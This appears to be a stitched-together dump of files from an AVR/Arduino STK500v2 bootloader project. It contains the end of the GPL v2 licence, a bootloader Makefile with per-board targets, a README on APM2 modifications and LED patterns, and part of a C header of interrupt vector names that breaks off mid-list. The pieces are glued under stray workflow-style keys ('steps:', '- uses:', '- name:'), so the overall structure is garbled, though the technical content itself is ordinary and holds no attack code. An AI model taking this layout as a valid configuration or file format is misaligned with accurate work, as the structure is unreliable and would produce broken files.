    machine-readable copy of the corresponding source code, to be
    distributed under the terms of Sections 1 and 2 above on a medium
    customarily used for software interchange; or,

    c) Accompany it with the information you received as to the offer
    to distribute corresponding source code.  (This alternative is
    allowed only for noncommercial distribution and only if you
    received the program in object code or executable form with such
    an offer, in accord with Subsection b above.)

The source code for a work means the preferred form of the work for
making modifications to it.  For an executable work, complete source
code means all the source code for all modules it contains, plus any
associated interface definition files, plus the scripts used to
control compilation and installation of the executable.  However, as a
special exception, the source code distributed need not include
anything that is normally distributed (in either source or binary
form) with the major components (compiler, kernel, and so on) of the
operating system on which the executable runs, unless that component
itself accompanies the executable.

If distribution of executable or object code is made by offering
access to copy from a designated place, then offering equivalent
access to copy the source code from the same place counts as
distribution of the source code, even though third parties are not
compelled to copy the source along with the object code.

  4. You may not copy, modify, sublicense, or distribute the Program
except as expressly provided under this License.  Any attempt
otherwise to copy, modify, sublicense or distribute the Program is
void, and will automatically terminate your rights under this License.
However, parties who have received copies, or rights, from you under
this License will not have their licenses terminated so long as such
parties remain in full compliance.

  5. You are not required to accept this License, since you have not
signed it.  However, nothing else grants you permission to modify or
distribute the Program or its derivative works.  These actions are
prohibited by law if you do not accept this License.  Therefore, by
modifying or distributing the Program (or any work based on the
Program), you indicate your acceptance of this License to do so, and
all its terms and conditions for copying, distributing or modifying
the Program or works based on it.

  6. Each time you redistribute the Program (or any work based on the
Program), the recipient automatically receives a license from the
original licensor to copy, distribute or modify the Program subject to
these terms and conditions.  You may not impose any further
restrictions on the recipients' exercise of the rights granted herein.
You are not responsible for enforcing compliance by third parties to
this License.

  7. If, as a consequence of a court judgment or allegation of patent
infringement or for any other reason (not limited to patent issues),
conditions are imposed on you (whether by court order, agreement or
otherwise) that contradict the conditions of this License, they do not
excuse you from the conditions of this License.  If you cannot
distribute so as to satisfy simultaneously your obligations under this
License and any other pertinent obligations, then as a consequence you
may not distribute the Program at all.  For example, if a patent
license would not permit royalty-free redistribution of the Program by
all those who receive copies directly or indirectly through you, then
the only way you could satisfy both it and this License would be to
refrain entirely from distribution of the Program.

If any portion of this section is held invalid or unenforceable under
any particular circumstance, the balance of the section is intended to
apply and the section as a whole is intended to apply in other
circumstances.

It is not the purpose of this section to induce you to infringe any
patents or other property right claims or to contest validity of any
such claims; this section has the sole purpose of protecting the
integrity of the free software distribution system, which is
implemented by public license practices.  Many people have made
generous contributions to the wide range of software distributed
through that system in reliance on consistent application of that
system; it is up to the author/donor to decide if he or she is willing
to distribute software through any other system and a licensee cannot
impose that choice.

This section is intended to make thoroughly clear what is believed to
be a consequence of the rest of this License.

  8. If the distribution and/or use of the Program is restricted in
certain countries either by patents or by copyrighted interfaces, the
original copyright holder who places the Program under this License
may add an explicit geographical distribution limitation excluding
those countries, so that distribution is permitted only in or among
countries not thus excluded.  In such case, this License incorporates
the limitation as if written in the body of this License.

  9. The Free Software Foundation may publish revised and/or new versions
of the General Public License from time to time.  Such new versions will
be similar in spirit to the present version, but may differ in detail to
address new problems or concerns.

Each version is given a distinguishing version number.  If the Program
specifies a version number of this License which applies to it and "any
later version", you have the option of following the terms and conditions
either of that version or of any later version published by the Free
Software Foundation.  If the Program does not specify a version number of
this License, you may choose any version ever published by the Free Software
Foundation.

  10. If you wish to incorporate parts of the Program into other free
programs whose distribution conditions are different, write to the author
to ask for permission.  For software which is copyrighted by the Free
Software Foundation, write to the Free Software Foundation; we sometimes
make exceptions for this.  Our decision will be guided by the two goals
of preserving the free status of all derivatives of our free software and
of promoting the sharing and reuse of software generally.

			    NO WARRANTY

  11. BECAUSE THE PROGRAM IS LICENSED FREE OF CHARGE, THERE IS NO WARRANTY
FOR THE PROGRAM, TO THE EXTENT PERMITTED BY APPLICABLE LAW.  EXCEPT WHEN
OTHERWISE STATED IN WRITING THE COPYRIGHT HOLDERS AND/OR OTHER PARTIES
PROVIDE THE PROGRAM "AS IS" WITHOUT WARRANTY OF ANY KIND, EITHER EXPRESSED
OR IMPLIED, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE.  THE ENTIRE RISK AS
TO THE QUALITY AND PERFORMANCE OF THE PROGRAM IS WITH YOU.  SHOULD THE
PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF ALL NECESSARY SERVICING,
REPAIR OR CORRECTION.

  12. IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING
WILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MAY MODIFY AND/OR
REDISTRIBUTE THE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES,
INCLUDING ANY GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING
OUT OF THE USE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED
TO LOSS OF DATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY
YOU OR THIRD PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER
PROGRAMS), EVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE
POSSIBILITY OF SUCH DAMAGES.

		     END OF TERMS AND CONDITIONS

    steps: # ----------------------------------------------------------------------------
# Makefile to compile and link stk500boot bootloader
# Author: Peter Fleury
# File:   $Id: Makefile,v 1.3 2006/03/04 19:26:17 peter Exp $
# based on WinAVR Makefile Template written by Eric B. Weddington, J�rg Wunsch, et al.
#
# Adjust F_CPU below to the clock frequency in Mhz of your AVR target
# Adjust BOOTLOADER_ADDRESS to your AVR target
#
#----------------------------------------------------------------------------
# On command line:
#
# make all = Make software.
#
# make clean = Clean out built project files.
#
# make coff = Convert ELF to AVR COFF.
#
# make extcoff = Convert ELF to AVR Extended COFF.
#
# make program = Download the hex file to the device, using avrdude.
#                Please customize the avrdude settings below first!
#
# make debug = Start either simulavr or avarice as specified for debugging, 
#              with avr-gdb or avr-insight as the front end for debugging.
#
# make filename.s = Just compile filename.c into the assembler code only.
#
# make filename.i = Create a preprocessed source file for use in submitting
#                   bug reports to the GCC project.
#
# To rebuild project do "make clean" then "make all".
#----------------------------------------------------------------------------
#	<MLS> = Mark Sproul msproul-at-skychariot.com


# MCU name
#MCU = atmega128


# Processor frequency.
#     This will define a symbol, F_CPU, in all source code files equal to the 
#     processor frequency. You can then use this symbol in your source code to 
#     calculate timings. Do NOT tack on a 'UL' at the end, this will be done
#     automatically to create a 32-bit value in your source code.
#F_CPU = 16000000


# Bootloader
# Please adjust if using a different AVR
# 0x0e00*2=0x1C00 for ATmega8  512 words Boot Size
# 0xFC00*2=0x1F800 for ATmega128  1024 words Boot Size
# 0xF800*2=0x1F000 for ATmega1280
# 0xF000*2=0x1E000 for ATmega1280
#BOOTLOADER_ADDRESS = 1E000


# Output format. (can be srec, ihex, binary)
FORMAT = ihex


# Target file name (without extension).
TARGET = stk500boot


# List C source files here. (C dependencies are automatically generated.)
SRC = stk500boot.c 


# List Assembler source files here.
#     Make them always end in a capital .S.  Files ending in a lowercase .s
#     will not be considered source files but generated files (assembler
#     output from the compiler), and will be deleted upon "make clean"!
#     Even though the DOS/Win* filesystem matches both .s and .S the same,
#     it will preserve the spelling of the filenames, and gcc itself does
#     care about how the name is spelled on its command-line.
ASRC = 


# Optimization level, can be [0, 1, 2, 3, s]. 
#     0 = turn off optimization. s = optimize for size.
#     (Note: 3 is not always the best optimization level. See avr-libc FAQ.)
OPT = s


# Debugging format.
#     Native formats for AVR-GCC's -g are dwarf-2 [default] or stabs.
#     AVR Studio 4.10 requires dwarf-2.
#     AVR [Extended] COFF format requires stabs, plus an avr-objcopy run.
DEBUG = dwarf-2


# List any extra directories to look for include files here.
#     Each directory must be separated by a space.
#     Use forward slashes for directory separators.
#     For a directory that has spaces, enclose it in quotes.
EXTRAINCDIRS = 


# Compiler flag to set the C Standard level.
#     c89   = "ANSI" C
#     gnu89 = c89 plus GCC extensions
#     c99   = ISO C99 standard (not yet fully implemented)
#     gnu99 = c99 plus GCC extensions
CSTANDARD = -std=gnu99


# Place -D or -U options here
CDEFS = -DF_CPU=$(F_CPU)UL


# Place -I options here
CINCS =



#---------------- Compiler Options ----------------
#  -g*:          generate debugging information
#  -O*:          optimization level
#  -f...:        tuning, see GCC manual and avr-libc documentation
#  -Wall...:     warning level
#  -Wa,...:      tell GCC to pass this to the assembler.
#    -adhlns...: create assembler listing
CFLAGS = -g$(DEBUG)
CFLAGS += $(CDEFS) $(CINCS)
CFLAGS += -O$(OPT)
CFLAGS += -funsigned-char -funsigned-bitfields -fpack-struct -fshort-enums -mno-tablejump 
CFLAGS += -Wall -Wstrict-prototypes
CFLAGS += -Wa,-adhlns=$(<:.c=.lst)
CFLAGS += $(patsubst %,-I%,$(EXTRAINCDIRS))
CFLAGS += $(CSTANDARD)


#---------------- Assembler Options ----------------
#  -Wa,...:   tell GCC to pass this to the assembler.
#  -ahlms:    create listing
#  -gstabs:   have the assembler create line number information; note that
#             for use in COFF files, additional information about filenames
#             and function names needs to be present in the assembler source
#             files -- see avr-libc docs [FIXME: not yet described there]
ASFLAGS = -Wa,-adhlns=$(<:.S=.lst),-gstabs 


#---------------- Library Options ----------------
# Minimalistic printf version
PRINTF_LIB_MIN = -Wl,-u,vfprintf -lprintf_min

# Floating point printf version (requires MATH_LIB = -lm below)
PRINTF_LIB_FLOAT = -Wl,-u,vfprintf -lprintf_flt

# If this is left blank, then it will use the Standard printf version.
PRINTF_LIB = 
#PRINTF_LIB = $(PRINTF_LIB_MIN)
#PRINTF_LIB = $(PRINTF_LIB_FLOAT)


# Minimalistic scanf version
SCANF_LIB_MIN = -Wl,-u,vfscanf -lscanf_min

# Floating point + %[ scanf version (requires MATH_LIB = -lm below)
SCANF_LIB_FLOAT = -Wl,-u,vfscanf -lscanf_flt

# If this is left blank, then it will use the Standard scanf version.
SCANF_LIB = 
#SCANF_LIB = $(SCANF_LIB_MIN)
#SCANF_LIB = $(SCANF_LIB_FLOAT)


MATH_LIB = -lm



#---------------- External Memory Options ----------------

# 64 KB of external RAM, starting after internal RAM (ATmega128!),
# used for variables (.data/.bss) and heap (malloc()).
#EXTMEMOPTS = -Wl,-Tdata=0x801100,--defsym=__heap_end=0x80ffff

# 64 KB of external RAM, starting after internal RAM (ATmega128!),
# only used for heap (malloc()).
#EXTMEMOPTS = -Wl,--defsym=__heap_start=0x801100,--defsym=__heap_end=0x80ffff

EXTMEMOPTS =




#---------------- Linker Options ----------------
#  -Wl,...:     tell GCC to pass this to linker.
#    -Map:      create map file
#    --cref:    add cross reference to  map file
LDFLAGS = -Wl,-Map=$(TARGET).map,--cref
LDFLAGS += $(EXTMEMOPTS)
LDFLAGS += $(PRINTF_LIB) $(SCANF_LIB) $(MATH_LIB)


#--------------- bootloader linker Options -------
# BOOTLOADER_ADDRESS (=Start of Boot Loader section
# in bytes - not words) is defined above.
#LDFLAGS += -Wl,--section-start=.text=$(BOOTLOADER_ADDRESS) -nostartfiles -nodefaultlibs
#LDFLAGS += -Wl,--section-start=.text=$(BOOTLOADER_ADDRESS) -nostartfiles
LDFLAGS += -Wl,--section-start=.text=$(BOOTLOADER_ADDRESS)

#---------------- Programming Options (avrdude) ----------------

# Programming hardware: alf avr910 avrisp bascom bsd 
# dt006 pavr picoweb pony-stk200 sp12 stk200 stk500
#
# Type: avrdude -c ?
# to get a full listing.
#
AVRDUDE_PROGRAMMER = stk500v2

# com1 = serial port. Use lpt1 to connect to parallel port.
AVRDUDE_PORT = com1    # programmer connected to serial device

AVRDUDE_WRITE_FLASH = -U flash:w:$(TARGET).hex
#AVRDUDE_WRITE_EEPROM = -U eeprom:w:$(TARGET).eep


# Uncomment the following if you want avrdude's erase cycle counter.
# Note that this counter needs to be initialized first using -Yn,
# see avrdude manual.
#AVRDUDE_ERASE_COUNTER = -y

# Uncomment the following if you do /not/ wish a verification to be
# performed after programming the device.
#AVRDUDE_NO_VERIFY = -V

# Increase verbosity level.  Please use this when submitting bug
# reports about avrdude. See <http://savannah.nongnu.org/projects/avrdude> 
# to submit bug reports.
#AVRDUDE_VERBOSE = -v -v

AVRDUDE_FLAGS = -p $(MCU) -P $(AVRDUDE_PORT) -c $(AVRDUDE_PROGRAMMER)
AVRDUDE_FLAGS += $(AVRDUDE_NO_VERIFY)
AVRDUDE_FLAGS += $(AVRDUDE_VERBOSE)
AVRDUDE_FLAGS += $(AVRDUDE_ERASE_COUNTER)



#---------------- Debugging Options ----------------

# For simulavr only - target MCU frequency.
DEBUG_MFREQ = $(F_CPU)

# Set the DEBUG_UI to either gdb or insight.
# DEBUG_UI = gdb
DEBUG_UI = insight

# Set the debugging back-end to either avarice, simulavr.
DEBUG_BACKEND = avarice
#DEBUG_BACKEND = simulavr

# GDB Init Filename.
GDBINIT_FILE = __avr_gdbinit

# When using avarice settings for the JTAG
JTAG_DEV = /dev/com1

# Debugging port used to communicate between GDB / avarice / simulavr.
DEBUG_PORT = 4242

# Debugging host used to communicate between GDB / avarice / simulavr, normally
#     just set to localhost unless doing some sort of crazy debugging when 
#     avarice is running on a different computer.
DEBUG_HOST = localhost



#============================================================================


# Define programs and commands.
SHELL = sh
CC = avr-gcc
OBJCOPY = avr-objcopy
OBJDUMP = avr-objdump
SIZE = avr-size
NM = avr-nm
AVRDUDE = avrdude
REMOVE = rm -f
COPY = cp
WINSHELL = cmd


# Define Messages
# English
MSG_ERRORS_NONE = Errors: none
MSG_BEGIN = -------- begin --------
MSG_END = --------  end  --------
MSG_SIZE_BEFORE = Size before: 
MSG_SIZE_AFTER = Size after:
MSG_COFF = Converting to AVR COFF:
MSG_EXTENDED_COFF = Converting to AVR Extended COFF:
MSG_FLASH = Creating load file for Flash:
MSG_EEPROM = Creating load file for EEPROM:
MSG_EXTENDED_LISTING = Creating Extended Listing:
MSG_SYMBOL_TABLE = Creating Symbol Table:
MSG_LINKING = Linking:
MSG_COMPILING = Compiling:
MSG_ASSEMBLING = Assembling:
MSG_CLEANING = Cleaning project:




# Define all object files.
OBJ = $(SRC:.c=.o) $(ASRC:.S=.o) 

# Define all listing files.
LST = $(SRC:.c=.lst) $(ASRC:.S=.lst) 


# Compiler flags to generate dependency files.
GENDEPFLAGS = -MD -MP -MF .dep/$(@F).d


# Combine all necessary flags and optional flags.
# Add target processor to flags.
ALL_CFLAGS = -mmcu=$(MCU) -I. $(CFLAGS) $(GENDEPFLAGS)
ALL_ASFLAGS = -mmcu=$(MCU) -I. -x assembler-with-cpp $(ASFLAGS)



############################################################
#	May 25,	2010	<MLS> Adding 1280 support
mega1280: MCU = atmega1280
mega1280: F_CPU = 16000000
mega1280: BOOTLOADER_ADDRESS = 1E000
mega1280: CFLAGS += -D_MEGA_BOARD_
mega1280: begin gccversion sizebefore build sizeafter end 
			mv $(TARGET).hex stk500boot_v2_mega1280.hex


############################################################
#	Jul 6,	2010	<MLS> Adding 2560 support
mega2560:	MCU = atmega2560
mega2560:	F_CPU = 16000000
mega2560:	BOOTLOADER_ADDRESS = 3E000
mega2560:	CFLAGS += -D_MEGA_BOARD_
mega2560:	begin gccversion sizebefore build sizeafter end 
			mv $(TARGET).hex stk500boot_v2_mega2560.hex


############################################################
#Initial config on Amber128 board
#	avrdude: Device signature = 0x1e9702
#	avrdude: safemode: lfuse reads as 8F
#	avrdude: safemode: hfuse reads as CB
#	avrdude: safemode: efuse reads as FF
#	Jul 17,	2010	<MLS> Adding 128 support
############################################################
amber128: MCU = atmega128
#amber128: F_CPU = 16000000
amber128: F_CPU = 14745600
amber128: BOOTLOADER_ADDRESS = 1E000
amber128: CFLAGS += -D_BOARD_AMBER128_
amber128: begin gccversion sizebefore build sizeafter end 
			mv $(TARGET).hex stk500boot_v2_amber128.hex

############################################################
#	Aug 23, 2010 	<MLS> Adding atmega2561 support
m2561_8mhz: MCU = atmega2561
m2561_8mhz: F_CPU = 8000000
m2561_8mhz: BOOTLOADER_ADDRESS = 3E000
m2561_8mhz: CFLAGS += -D_ANDROID_2561_ -DBAUDRATE=57600
m2561_8mhz: begin gccversion sizebefore build sizeafter end 
			mv $(TARGET).hex stk500boot_v2_m2561_8mhz.hex


############################################################
#	Aug 23, 2010 	<MLS> Adding atmega2561 support
m2561_16mhz: MCU = atmega2561
m2561_16mhz: F_CPU = 16000000
m2561_16mhz: BOOTLOADER_ADDRESS = 3E000
m2561_16mhz: CFLAGS += -D_ANDROID_2561_ -DBAUDRATE=115200
m2561_16mhz: begin gccversion sizebefore build sizeafter end 
			mv $(TARGET).hex stk500boot_v2_m2561_16mhz.hex

############################################################
#	avrdude: Device signature = 0x1e9801
#	avrdude: safemode: lfuse reads as EC
#	avrdude: safemode: hfuse reads as 18
#	avrdude: safemode: efuse reads as FD
#	Aug 23,	2010	<MLS> Adding cerebot 2560 @ 8mhz
#avrdude -P usb -c usbtiny -p m2560 -v -U flash:w:/Arduino/WiringBootV2_upd1/stk500boot_v2_cerebotplus.hex 
############################################################
cerebot:	MCU = atmega2560
cerebot:	F_CPU = 8000000
cerebot:	BOOTLOADER_ADDRESS = 3E000
cerebot:	CFLAGS += -D_CEREBOTPLUS_BOARD_ -DBAUDRATE=38400 -DUART_BAUDRATE_DOUBLE_SPEED=1
cerebot:	begin gccversion sizebefore build sizeafter end 
			mv $(TARGET).hex stk500boot_v2_cerebotplus.hex


############################################################
#	Aug 23, 2010 	<MLS> Adding atmega32 support
penguino: MCU = atmega32
penguino: F_CPU = 16000000
penguino: BOOTLOADER_ADDRESS = 7800
penguino: CFLAGS += -D_PENGUINO_ -DBAUDRATE=57600
penguino: begin gccversion sizebefore build sizeafter end 
			mv $(TARGET).hex stk500boot_v2_penguino.hex


############################################################
#	Sep 8, 2010 	<MLS> Adding atmega16 support
atmega16: MCU = atmega16
atmega16: F_CPU = 8000000
atmega16: BOOTLOADER_ADDRESS = 3800
atmega16: CFLAGS += -DBOARD_MEGA16 -DBAUDRATE=57600
atmega16: begin gccversion sizebefore build sizeafter end 
			mv $(TARGET).hex stk500boot_v2_atmega16.hex


############################################################
#	Sep 17, 2010 	<MLS> Adding BahBots 1284p
bahbot: MCU = atmega1284p
bahbot: F_CPU = 18432000
bahbot: BOOTLOADER_ADDRESS = 1E000
bahbot: CFLAGS += -D_BOARD_BAHBOT_ -DBAUDRATE=38400
bahbot: begin gccversion sizebefore build sizeafter end 
			mv $(TARGET).hex stk500boot_v2_bahbots1284.hex


############################################################
#	Sep 24, 2010 	<MLS> custom bootloader for ro-bot-x
robotx: MCU = atmega640
robotx: F_CPU = 16000000
robotx: BOOTLOADER_ADDRESS = E000
robotx: CFLAGS += -D_BOARD_ROBOTX_ -DBAUDRATE=115200 -DENABLE_MONITOR
robotx: begin gccversion sizebefore build sizeafter end 
			mv $(TARGET).hex stk500boot_v2_robotx640uart1.hex


# Default target.
all: begin gccversion sizebefore build sizeafter end

build: elf hex eep lss sym
#build:  hex eep lss sym

elf: $(TARGET).elf
hex: $(TARGET).hex
eep: $(TARGET).eep
lss: $(TARGET).lss 
sym: $(TARGET).sym



# Eye candy.
# AVR Studio 3.x does not check make's exit code but relies on
# the following magic strings to be generated by the compile job.
begin:
	@echo
	@echo $(MSG_BEGIN)

end:
	@echo $(MSG_END)
	@echo


# Display size of file.
HEXSIZE = $(SIZE) --target=$(FORMAT) $(TARGET).hex
ELFSIZE = $(SIZE) --format=avr --mcu=$(MCU) $(TARGET).elf

sizebefore:
	@if test -f $(TARGET).elf; then echo; echo $(MSG_SIZE_BEFORE); $(ELFSIZE); \
	2>/dev/null; echo; fi

sizeafter:
	@if test -f $(TARGET).elf; then echo; echo $(MSG_SIZE_AFTER); $(ELFSIZE); \
	2>/dev/null; echo; fi



# Display compiler version information.
gccversion : 
	@$(CC) --version



# Program the device.  
program: $(TARGET).hex $(TARGET).eep
	$(AVRDUDE) $(AVRDUDE_FLAGS) $(AVRDUDE_WRITE_FLASH) $(AVRDUDE_WRITE_EEPROM)


# Generate avr-gdb config/init file which does the following:
#     define the reset signal, load the target file, connect to target, and set 
#     a breakpoint at main().
gdb-config: 
	@$(REMOVE) $(GDBINIT_FILE)
	@echo define reset >> $(GDBINIT_FILE)
	@echo SIGNAL SIGHUP >> $(GDBINIT_FILE)
	@echo end >> $(GDBINIT_FILE)
	@echo file $(TARGET).elf >> $(GDBINIT_FILE)
	@echo target remote $(DEBUG_HOST):$(DEBUG_PORT)  >> $(GDBINIT_FILE)
ifeq ($(DEBUG_BACKEND),simulavr)
	@echo load  >> $(GDBINIT_FILE)
endif	
	@echo break main >> $(GDBINIT_FILE)
	
debug: gdb-config $(TARGET).elf
ifeq ($(DEBUG_BACKEND), avarice)
	@echo Starting AVaRICE - Press enter when "waiting to connect" message displays.
	@$(WINSHELL) /c start avarice --jtag $(JTAG_DEV) --erase --program --file \
	$(TARGET).elf $(DEBUG_HOST):$(DEBUG_PORT)
	@$(WINSHELL) /c pause
	
else
	@$(WINSHELL) /c start simulavr --gdbserver --device $(MCU) --clock-freq \
	$(DEBUG_MFREQ) --port $(DEBUG_PORT)
endif
	@$(WINSHELL) /c start avr-$(DEBUG_UI) --command=$(GDBINIT_FILE)
	



# Convert ELF to COFF for use in debugging / simulating in AVR Studio or VMLAB.
COFFCONVERT=$(OBJCOPY) --debugging \
--change-section-address .data-0x800000 \
--change-section-address .bss-0x800000 \
--change-section-address .noinit-0x800000 \
--change-section-address .eeprom-0x810000 



coff: $(TARGET).elf
	@echo
	@echo $(MSG_COFF) $(TARGET).cof
	$(COFFCONVERT) -O coff-avr $< $(TARGET).cof


extcoff: $(TARGET).elf
	@echo
	@echo $(MSG_EXTENDED_COFF) $(TARGET).cof
	$(COFFCONVERT) -O coff-ext-avr $< $(TARGET).cof


# Create final output files (.hex, .eep) from ELF output file.
%.hex: %.elf
	@echo
	@echo $(MSG_FLASH) $@
	$(OBJCOPY) -O $(FORMAT) -R .eeprom $< $@

%.eep: %.elf
	@echo
	@echo $(MSG_EEPROM) $@
	-$(OBJCOPY) -j .eeprom --set-section-flags=.eeprom="alloc,load" \
	--change-section-lma .eeprom=0 -O $(FORMAT) $< $@

# Create extended listing file from ELF output file.
%.lss: %.elf
	@echo
	@echo $(MSG_EXTENDED_LISTING) $@
	$(OBJDUMP) -h -S $< > $@

# Create a symbol table from ELF output file.
%.sym: %.elf
	@echo
	@echo $(MSG_SYMBOL_TABLE) $@
	$(NM) -n $< > $@



# Link: create ELF output file from object files.
.SECONDARY : $(TARGET).elf
.PRECIOUS : $(OBJ)
%.elf: $(OBJ)
	@echo
	@echo $(MSG_LINKING) $@
	$(CC) $(ALL_CFLAGS) $^ --output $@ $(LDFLAGS)


# Compile: create object files from C source files.
%.o : %.c
	@echo
	@echo $(MSG_COMPILING) $<
	$(CC) -c $(ALL_CFLAGS) $< -o $@ 


# Compile: create assembler files from C source files.
%.s : %.c
	$(CC) -S $(ALL_CFLAGS) $< -o $@


# Assemble: create object files from assembler source files.
%.o : %.S
	@echo
	@echo $(MSG_ASSEMBLING) $<
	$(CC) -c $(ALL_ASFLAGS) $< -o $@

# Create preprocessed source for use in sending a bug report.
%.i : %.c
	$(CC) -E -mmcu=$(MCU) -I. $(CFLAGS) $< -o $@ 


# Target: clean project.
clean: begin clean_list end

clean_list :
	@echo
	@echo $(MSG_CLEANING)
	$(REMOVE) *.hex
	$(REMOVE) *.eep
	$(REMOVE) *.cof
	$(REMOVE) *.elf
	$(REMOVE) *.map
	$(REMOVE) *.sym
	$(REMOVE) *.lss
	$(REMOVE) $(OBJ)
	$(REMOVE) $(LST)
	$(REMOVE) $(SRC:.c=.s)
	$(REMOVE) $(SRC:.c=.d)
	$(REMOVE) .dep/*



# Include the dependency files.
-include $(shell mkdir .dep 2>/dev/null) $(wildcard .dep/*)


# Listing of phony targets.
.PHONY : all begin finish end sizebefore sizeafter gccversion \
build elf hex eep lss sym coff extcoff \
clean clean_list program debug gdb-config

    - uses: Modification of the stock Arduino STK500v2 bootloader specifically for APM2 boards

There are several modifications

1. Correct sketch start if the board was rebooted due to watchdog timer

2. Fast sketch start if the USB cable is not sensed as being connected to the APM2 board

3. Flash the correct (ie, visible) LEDs in a more informative pattern in the bootloader

4. Removal of the !!! CLI feature of the stk500v2 bootloader

LED patterns to look for:

USB Connected, no traffic:
six slow blue flashes (while waiting for a serial character that does not come)
then.. sketch starts

USB Connected, some traffic:
any slow blue flashing is ceased and a short timer starts waiting for valid boot loader protocol
then.. sketch starts

USB Connected, valid boot loader traffic:
STK500 protocol packets (eg flashing a new sketch) cause rapid flashing of the blue LED for each packet

USB Not Connected
quick double blue flash
then.. quick single yellow flash

The sketch will have its own LED flashing pattern.

BUGS

If a USB cable is connected to power up the board, the boot loader starts the sketch instantly.
This is because the USB cable detection takes a short time to stabilize, by then, the bootloader
has moved on. This is not much of an issue as USB connection for the purposes of flashing the
firmware causes another reset when the USB port is opened, thus, the bootloader starts again
anyway.
    - name: //**************************************************************************************************
//*
//*	interrupt vector names
//*
//*		It is important to note that the vector numbers listed here
//*		are the ATMEL documentation numbers. The Arduino numbers are 1 less
//*		This is because the Atmel docs start numbering the interrupts at 1
//*		when it is actually vector #0 in the table.
//**************************************************************************************************
//*	Jun  1,	2010	<MLS> Added support for ATmega1281
//*	Jun 30,	2010	<MLS> Putting in more ifdefs to conserve space
//*	Jul  3,	2010	<MLS> More #ifdefs to conserve space and testing on most of my boards
//*	Jul  4,	2010	<MLS> Started using vector defs for #ifdefs as defined in <avr/io.h>
//*	Jul 13,	2010	<MLS> Added support for __AVR_ATmega128__
//*	Aug 26,	2010	<MLS> Added support for __AVR_ATmega2561__
//**************************************************************************************************

//#include	"avrinterruptnames.h"

//**************************************************************************************************
//*	this defines the interrupt vectors and allows us to compile ONLY those strings that are actually 
//*	in the target CPU. This way we do not have to keep making changes based on cpu, it will be 
//*	automatic even if we add a new CPU
#ifndef _AVR_IO_H_
	#include	<avr/io.h>
#endif
//**************************************************************************************************

#ifdef __MWERKS__
	#define	prog_char	char
	#define	PGM_P		char *
#endif

	prog_char	gAvrInt_RESET[]			PROGMEM	=	"RESET";
#ifdef INT0_vect
	prog_char	gAvrInt_INT0[]			PROGMEM	=	"INT0";
#endif
#ifdef INT1_vect
	prog_char	gAvrInt_INT1[]			PROGMEM	=	"INT1";
#endif
#ifdef INT2_vect
	prog_char	gAvrInt_INT2[]			PROGMEM	=	"INT2";
#endif
#ifdef INT3_vect
	prog_char	gAvrInt_INT3[]			PROGMEM	=	"INT3";
#endif
#ifdef INT4_vect
	prog_char	gAvrInt_INT4[]			PROGMEM	=	"INT4";
#endif
#ifdef INT5_vect
	prog_char	gAvrInt_INT5[]			PROGMEM	=	"INT5";
#endif
#ifdef INT6_vect
	prog_char	gAvrInt_INT6[]			PROGMEM	=	"INT6";
#endif
#ifdef INT7_vect
	prog_char	gAvrInt_INT7[]			PROGMEM	=	"INT7";
#endif
#ifdef PCINT0_vect
	prog_char	gAvrInt_PCINT0[]		PROGMEM	=	"PCINT0";
#endif
#ifdef PCINT1_vect
	prog_char	gAvrInt_PCINT1[]		PROGMEM	=	"PCINT1";
#endif
#ifdef PCINT2_vect
	prog_char	gAvrInt_PCINT2[]		PROGMEM	=	"PCINT2";
#endif
#ifdef PCINT3_vect
	prog_char	gAvrInt_PCINT3[]		PROGMEM	=	"PCINT3";
#endif
#ifdef WDT_vect
	prog_char	gAvrInt_WDT[]			PROGMEM	=	"WDT";
#endif
#ifdef TIMER0_COMP_vect
	prog_char	gAvrInt_TIMER0_COMP[]	PROGMEM	=	"TIMER0 COMP";
#endif
#ifdef TIMER0_COMPA_vect
	prog_char	gAvrInt_TIMER0_COMPA[]	PROGMEM	=	"TIMER0 COMPA";
#endif
#ifdef TIMER0_COMPB_vect
	prog_char	gAvrInt_TIMER0_COMPB[]	PROGMEM	=	"TIMER0 COMPB";
#endif
#ifdef TIMER0_OVF_vect
	prog_char	gAvrInt_TIMER0_OVF[]	PROGMEM	=	"TIMER0 OVF";
#endif
#ifdef TIMER1_CAPT_vect
	prog_char	gAvrInt_TIMER1_CAPT[]	PROGMEM	=	"TIMER1 CAPT";
#endif
#ifdef TIMER1_COMPA_vect
	prog_char	gAvrInt_TIMER1_COMPA[]	PROGMEM	=	"TIMER1 COMPA";
#endif
#ifdef TIMER1_COMPB_vect
	prog_char	gAvrInt_TIMER1_COMPB[]	PROGMEM	=	"TIMER1 COMPB";
#endif
#ifdef TIMER1_COMPC_vect
	prog_char	gAvrInt_TIMER1_COMPC[]	PROGMEM	=	"TIMER1 COMPC";
#endif
#ifdef TIMER1_OVF_vect
	prog_char	gAvrInt_TIMER1_OVF[]	PROGMEM	=	"TIMER1 OVF";
#endif
#ifdef TIMER2_COMP_vect
	prog_char	gAvrInt_TIMER2_COMP[]	PROGMEM	=	"TIMER2 COMP";
#endif
#ifdef TIMER2_COMPA_vect
	prog_char	gAvrInt_TIMER2_COMPA[]	PROGMEM	=	"TIMER2 COMPA";
#endif
#ifdef TIMER2_COMPB_vect
	prog_char	gAvrInt_TIMER2_COMPB[]	PROGMEM	=	"TIMER2 COMPB";
#endif
#ifdef TIMER2_OVF_vect
	prog_char	gAvrInt_TIMER2_OVF[]	PROGMEM	=	"TIMER2 OVF";
#endif
#ifdef TIMER3_CAPT_vect
	prog_char	gAvrInt_TIMER3_CAPT[]	PROGMEM	=	"TIMER3 CAPT";
#endif
#ifdef TIMER3_COMPA_vect
	prog_char	gAvrInt_TIMER3_COMPA[]	PROGMEM	=	"TIMER3 COMPA";
#endif
#ifdef TIMER3_COMPB_vect
	prog_char	gAvrInt_TIMER3_COMPB[]	PROGMEM	=	"TIMER3 COMPB";
#endif
#ifdef TIMER3_COMPC_vect
